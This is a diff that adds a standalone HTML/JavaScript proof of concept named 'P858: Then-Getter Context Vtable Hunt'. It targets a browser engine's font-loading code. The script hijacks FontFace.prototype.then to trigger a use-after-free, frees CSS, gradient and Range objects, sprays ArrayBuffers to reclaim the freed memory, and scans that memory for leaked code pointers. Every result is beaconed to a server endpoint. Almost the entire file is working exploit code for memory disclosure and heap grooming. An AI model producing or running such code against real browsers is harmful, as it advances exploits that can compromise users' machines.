@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P858</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:11px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:93vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P858: Then-Getter Context Vtable Hunt</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P858-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+bn('BOOT','start');
+log('Hypothesis: the FontFace then-getter reentrant context prevents','info');
+log('bmalloc zeroing. If true, ALL objects freed INSIDE the getter','info');
+log('will leave residue — including vtable-bearing objects.','info');
+log('','');
+
+function isCodePtr(bv) {
+  if (bv === 0n) return false;
+  if (bv === 0xFFFFFFFFFFFFFFFFn) return false;
+  if (bv === 0xFFFFFFFF00000000n) return false;
+  var hi = Number(bv >> 32n);
+  var lo = Number(bv & 0xFFFFFFFFn);
+  if (hi >= 0x10 && hi <= 0x1F) return false;
+  if (hi >= 1 && hi <= 0xFF && lo > 0) return true;
+  return false;
+}
+function isAnyPtr(bv) {
+  if (bv === 0n) return false;
+  if (bv === 0xFFFFFFFFFFFFFFFFn) return false;
+  if (bv === 0xFFFFFFFF00000000n) return false;
+  if (bv === 1n) return false;
+  var hi = Number(bv >> 32n);
+  if (hi >= 1 && hi <= 0xFF) return true;
+  return false;
+}
+
+/* All scanning happens inside the then getter, so store results globally */
+window.__results = {};
+
+/* ============================================================
+ * The then-getter does EVERYTHING:
+ * 1. Free CSSFontFace (standard UAF)
+ * 2. Create+destroy CSS objects with vtables INSIDE the getter
+ * 3. Create+destroy CanvasGradient objects INSIDE the getter
+ * 4. Spray ABs at ALL sizes INSIDE the getter
+ * 5. Scan immediately
+ * ============================================================ */
+
+var stM = document.createElement('style');
+stM.textContent = "@font-face{font-family:bbA;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(stM);
+var faceM = new FontFace('fA', "local('Helvetica')", {unicodeRange: 'U+0041'});
+document.fonts.add(faceM);
+void faceM.loaded;
+var mFired = false;
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (mFired) return undefined;
+    mFired = true;
+    bn('GETTER','entered');
+
+    /* === STEP 1: Standard FontFace UAF === */
+    if (stM) { stM.remove(); stM.textContent = ''; stM = null; }
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+
+    /* Spray AB(192) for FontFace reclaim */
+    var mABs = [];
+    for (var i = 0; i < 80; i++) mABs.push(new ArrayBuffer(192));
+    try { document.fonts.check('1em bbA'); } catch(e) {}
+    document.body.offsetHeight;
+    window.__mABs = mABs;
+
+    /* Find FontFace hit */
+    var mSlot = -1, mH = null;
+    for (var i = 0; i < mABs.length; i++) {
+      var bv = new BigUint64Array(mABs[i]);
+      var nz = 0;
+      for (var j = 0; j < bv.length; j++) if (bv[j] !== 0n) nz++;
+      if (nz >= 2) {
+        mSlot = i;
+        mH = '0x' + bv[11].toString(16);
+        break;
+      }
+    }
+    bn('FONT-HIT', 'slot=' + mSlot + '|H=' + mH);
+
+    /* === STEP 2: Create + destroy CSS objects INSIDE the getter === */
+    var cssText = '';
+    for (var i = 0; i < 40; i++) {
+      cssText += '@font-face{font-family:gf' + i + ';src:local(Helvetica);font-weight:' + ((i%9)*100+100) + ';}\n';
+      cssText += '.gr' + i + '{color:rgb(' + i + ',' + (i*2) + ',' + (i*3) + ');margin:' + i + 'px;padding:' + (i+1) + 'px;}\n';
+    }
+    for (var i = 0; i < 10; i++) {
+      cssText += '@keyframes gk' + i + '{0%{opacity:0}50%{opacity:1}100%{opacity:0}}\n';
+    }
+    var gSt = document.createElement('style');
+    gSt.textContent = cssText;
+    document.head.appendChild(gSt);
+    document.body.offsetHeight;
+    var gRules = 0;
+    try { gRules = gSt.sheet.cssRules.length; } catch(e) {}
+
+    /* Remove immediately — frees CSS objects IN getter context */
+    gSt.remove();
+    gSt.textContent = '';
+    gSt = null;
+    document.body.offsetHeight;
+    bn('CSS-FREED', 'rules=' + gRules);
+
+    /* Spray at CSS object sizes */
+    var cssSizes = [32, 48, 64, 80, 96, 112, 128, 160, 224, 256, 320, 384];
+    var cssABs = {};
+    for (var s = 0; s < cssSizes.length; s++) {
+      var sz = cssSizes[s];
+      var abs = [];
+      for (var i = 0; i < 200; i++) abs.push(new ArrayBuffer(sz));
+      cssABs[sz] = abs;
+    }
+
+    /* Scan CSS ABs */
+    var cssCode = 0, cssAny = 0, cssNZ = 0;
+    var cssHits = [], cssAnySamp = [], cssNZSamp = [];
+    for (var sz in cssABs) {
+      var abs = cssABs[sz];
+      for (var i = 0; i < abs.length; i++) {
+        var bv = new BigUint64Array(abs[i]);
+        for (var j = 0; j < bv.length; j++) {
+          var v = bv[j];
+          if (v !== 0n) {
+            cssNZ++;
+            if (cssNZSamp.length < 8) cssNZSamp.push('s' + sz + '[' + i + '][' + j + ']=0x' + v.toString(16));
+          }
+          if (isCodePtr(v)) {
+            cssCode++;
+            if (cssHits.length < 8) cssHits.push('s' + sz + '[' + i + '][' + j + ']=0x' + v.toString(16));
+          }
+          if (isAnyPtr(v)) {
+            cssAny++;
+            if (cssAnySamp.length < 8) cssAnySamp.push('s' + sz + '[' + i + '][' + j + ']=0x' + v.toString(16));
+          }
+        }
+      }
+    }
+    var cssR = 'code=' + cssCode + '|any=' + cssAny + '|nz=' + cssNZ;
+    if (cssHits.length > 0) cssR += '|cH=' + cssHits.join(';');
+    if (cssAnySamp.length > 0) cssR += '|aH=' + cssAnySamp.join(';');
+    if (cssNZSamp.length > 0) cssR += '|nzS=' + cssNZSamp.join(';');
+    bn('CSS-SCAN', cssR.slice(0, 1400));
+    window.__results.css = cssR;
+
+    /* === STEP 3: Create + destroy CanvasGradients INSIDE the getter === */
+    var tmpC = document.createElement('canvas');
+    tmpC.width = 1; tmpC.height = 1;
+    var tmpCtx = tmpC.getContext('2d');
+    var grads = [];
+    for (var i = 0; i < 300; i++) {
+      var g = tmpCtx.createLinearGradient(0, 0, i+1, i+1);
+      g.addColorStop(0, 'red');
+      g.addColorStop(1, 'blue');
+      grads.push(g);
+    }
+    /* Drop all refs — GC might not run immediately but refs are gone */
+    grads = null;
+    tmpCtx = null;
+    tmpC = null;
+
+    /* Also create+destroy Range objects inside getter */
+    var ranges = [];
+    for (var i = 0; i < 200; i++) ranges.push(document.createRange());
+    for (var i = 0; i < ranges.length; i++) ranges[i].detach();
+    ranges = null;
+
+    /* Spray at gradient/Range sizes */
+    var objSizes = [32, 48, 64, 80, 96, 128, 160, 192, 256];
+    var objABs = {};
+    for (var s = 0; s < objSizes.length; s++) {
+      var sz = objSizes[s];
+      var abs = [];
+      for (var i = 0; i < 300; i++) abs.push(new ArrayBuffer(sz));
+      objABs[sz] = abs;
+    }
+
+    /* Scan */
+    var objCode = 0, objAny = 0, objNZ = 0;
+    var objHits = [], objNZSamp = [];
+    for (var sz in objABs) {
+      var abs = objABs[sz];
+      for (var i = 0; i < abs.length; i++) {
+        var bv = new BigUint64Array(abs[i]);
+        for (var j = 0; j < bv.length; j++) {
+          var v = bv[j];
+          if (v !== 0n) { objNZ++; if (objNZSamp.length < 8) objNZSamp.push('s' + sz + '[' + i + '][' + j + ']=0x' + v.toString(16)); }
+          if (isCodePtr(v)) { objCode++; if (objHits.length < 8) objHits.push('s' + sz + '[' + i + '][' + j + ']=0x' + v.toString(16)); }
+          if (isAnyPtr(v)) objAny++;
+        }
+      }
+    }
+    var objR = 'code=' + objCode + '|any=' + objAny + '|nz=' + objNZ;
+    if (objHits.length > 0) objR += '|cH=' + objHits.join(';');
+    if (objNZSamp.length > 0) objR += '|nzS=' + objNZSamp.join(';');
+    bn('OBJ-SCAN', objR.slice(0, 1400));
+    window.__results.obj = objR;
+
+    /* === STEP 4: Additional FontFace objects freed INSIDE getter === */
+    var extraFaces = [];
+    for (var i = 0; i < 30; i++) {
+      var ef = new FontFace('ef' + i, "local('Helvetica')", {unicodeRange: 'U+00' + (41 + (i % 26)).toString(16).toUpperCase()});
+      document.fonts.add(ef);
+      extraFaces.push(ef);
+    }
+    for (var i = 0; i < extraFaces.length; i++) {
+      try { document.fonts.delete(extraFaces[i]); } catch(e) {}
+    }
+    extraFaces = null;
+
+    /* Spray 192B again for extra FontFace slots */
+    var extra192 = [];
+    for (var i = 0; i < 200; i++) extra192.push(new ArrayBuffer(192));
+
+    var extCode = 0, extAny = 0, extNZ = 0;
+    var extHits = [], extNZSamp = [];
+    for (var i = 0; i < extra192.length; i++) {
+      var bv = new BigUint64Array(extra192[i]);
+      for (var j = 0; j < bv.length; j++) {
+        var v = bv[j];
+        if (v !== 0n) { extNZ++; if (extNZSamp.length < 8) extNZSamp.push('[' + i + '][' + j + ']=0x' + v.toString(16)); }
+        if (isCodePtr(v)) { extCode++; if (extHits.length < 8) extHits.push('[' + i + '][' + j + ']=0x' + v.toString(16)); }
+        if (isAnyPtr(v)) extAny++;
+      }
+    }
+    var extR = 'code=' + extCode + '|any=' + extAny + '|nz=' + extNZ;
+    if (extHits.length > 0) extR += '|cH=' + extHits.join(';');
+    if (extNZSamp.length > 0) extR += '|nzS=' + extNZSamp.join(';');
+    bn('EXTRA-FONT-SCAN', extR.slice(0, 1400));
+    window.__results.ext = extR;
+
+    bn('GETTER-DONE', 'cssCode=' + cssCode + '|objCode=' + objCode + '|extCode=' + extCode + '|cssNZ=' + cssNZ + '|objNZ=' + objNZ + '|extNZ=' + extNZ);
+    return undefined;
+  }, set: function() {}
+});
+
+document.fonts.load('1em fA, bbA', 'AB');
+
+/* Post-getter reporting */
+setTimeout(function() {
+  delete FontFace.prototype.then;
+  var R = window.__results;
+  log('=== RESULTS ===', 'hot');
+  log('CSS teardown inside getter: ' + (R.css || 'not run'), R.css && R.css.indexOf('code=0') !== 0 ? 'hot' : 'info');
+  log('Objects inside getter: ' + (R.obj || 'not run'), R.obj && R.obj.indexOf('code=0') !== 0 ? 'hot' : 'info');
+  log('Extra FontFace inside getter: ' + (R.ext || 'not run'), R.ext && R.ext.indexOf('code=0') !== 0 ? 'hot' : 'info');
+
+  if (window.__mABs) {
+    for (var i = 0; i < window.__mABs.length; i++) {
+      var bv = new BigUint64Array(window.__mABs[i]);
+      var nz = 0;
+      for (var j = 0; j < bv.length; j++) if (bv[j] !== 0n) nz++;
+      if (nz >= 2) {
+        log('FontFace UAF confirmed: slot=' + i + ' q11=0x' + bv[11].toString(16) + ' q13=0x' + bv[13].toString(16), 'ok');
+        break;
+      }
+    }
+  }
+
+  log('','');
+  log('====== P858 COMPLETE ======', 'hot');
+  bn('DONE', 'complete');
+}, 500);
+</script></body></html>
